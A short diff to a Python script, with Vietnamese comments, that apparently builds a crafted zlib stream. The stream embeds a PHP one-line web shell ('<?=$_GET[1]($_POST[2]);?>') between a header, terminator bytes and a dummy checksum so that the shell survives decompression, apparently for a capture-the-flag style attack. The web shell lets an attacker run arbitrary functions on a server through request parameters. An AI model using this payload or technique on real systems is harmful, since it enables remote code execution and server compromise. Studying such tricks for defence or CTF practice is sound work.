@@ -233,8 +233,8 @@ def inflate_block_fixed(r, o):
 
     inflate_block_data(r, literal_length_tree, distance_tree, o)
 
-metadata_and_something = b'x\x9cc^' # Chủ yếu là metadata để compress
-payload = b'<?=$_GET[1]($_POST[2]);?>'
+metadata_and_something = b'x\x9cc^' # Chủ yếu là metadata để decompress
+payload = b'<?=$_GET[1]($_POST[2]);?>' # Kết thúc nên là '>'
 terminate_symbol = b'\x00\x00' # Đảm bảo luôn có 7 bit 0 sau payload
 checksum = b'n\xcf\x07;' # checksum phải có chính xác 4 byte, còn giá trị để thế nào cũng được vì implement ở trên bỏ qua checksum nhưng vẫn kiểm tra format nên cần đủ 4 byte
 t = decompress(metadata_and_something + payload + terminate_symbol + checksum)
